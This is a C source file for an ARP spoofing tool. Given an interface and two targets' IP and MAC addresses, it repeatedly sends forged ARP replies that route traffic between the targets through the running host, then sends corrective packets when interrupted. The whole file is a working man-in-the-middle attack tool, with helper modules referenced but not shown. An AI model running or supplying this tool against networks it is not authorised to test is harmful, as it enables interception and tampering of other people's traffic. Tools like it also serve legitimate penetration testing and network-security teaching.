#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
//#include <netinet/ether.h>

#include <signal.h>
#include <unistd.h>

#include "utils.h"
#include "arp.h"
#include "packet.h"
#include "rawsock.h"
#include "mutils.h"

/* interval between sending the packets (in secons) */
#define SLEEP_DELAY 1

/* number of packets for each target that will be
 * send after pressig ^C to unpoison the target */
#define UNPOISON_COUNT 5

rawsock_t rs; // socket
struct arp_packet packet1_cl; // unpoisoning arp packet1
struct arp_packet packet2_cl; // unpoisoning arp packet2

sig_atomic_t clean = 0; // if ^C pressed, this is set to 1 and cleanup function is called then

/* send packet p and write message to standard output */
void
sendpacket(struct arp_packet * p)
{
    char s_hwa_str[HWA_STR_LEN];
    char s_ipa_str[IPA_STR_LEN];
    char t_hwa_str[HWA_STR_LEN];
    char t_ipa_str[IPA_STR_LEN];

    // get string representation of adresses
    hwa_tostr(s_hwa_str, p->sender_hwa);
    ipa_tostr(s_ipa_str, p->sender_ipa);
    hwa_tostr(t_hwa_str, p->target_hwa);
    ipa_tostr(t_ipa_str, p->target_ipa);

    // print and send
    printf("ARP reply to %s (%s): %s is at %s\n", t_ipa_str, t_hwa_str, s_ipa_str, s_hwa_str);
    rawsend(rs, p, sizeof(struct arp_packet));

}


/* 
 * this method triggers on SIGINT and
 * set make that cleanup method will
 * trigger soon
 */
void sighandler()
{
  clean = 1;
}

/* 
 * sends 5 unpoisoning packets for both
 * targets, close socket and exit program
 */
void
cleanup()
{
  printf("Cleaning up and unpoisoning targets with %d packets.\n", UNPOISON_COUNT);
  int i = 0;
  for(; i < UNPOISON_COUNT; ++i) {
    sendpacket(&packet1_cl);
    sendpacket(&packet2_cl);
    sleep(SLEEP_DELAY);
  }

  rawclose(rs);
  exit(0);
}

void
showusage(int argc, char ** argv)
{
  printf("Usage: %s <interface> <target1-ip> \
<target1-mac> <target2-ip> <target2-mac>\n\
Example: %s wlan0 192.168.1.1 \
12:23:34:45:56:67 192.168.1.42 11:22:33:44:55:66\n", argv[0], argv[0]);

  exit(1);
}

int
main(int argc, char ** argv)
{
  if (argc < 6)
    showusage(argc, argv);

  process_args(argc, argv);

  // create 2 poisoning packets and 2 unpoisoning packets
  struct arp_packet packet1 = create_arp_packet(ipa1, hwa1, ipa2, hwa_host);
  struct arp_packet packet2 = create_arp_packet(ipa2, hwa2, ipa1, hwa_host);
  packet1_cl = create_arp_packet(ipa1, hwa1, ipa2, hwa2);
  packet2_cl = create_arp_packet(ipa2, hwa2, ipa1, hwa1);

  // initialize socket
  rs = rawsocket_arp(if_name);

  // send unpoisoning packets after pressing ^C
  signal(SIGINT, sighandler);

  // start sending packets
  puts("Poisoning targets with ARP packets");
  while (1) {
    sendpacket(&packet1);
    sendpacket(&packet2);
    sleep(SLEEP_DELAY);

    if(clean)
      cleanup();
  }

  return 0;
}
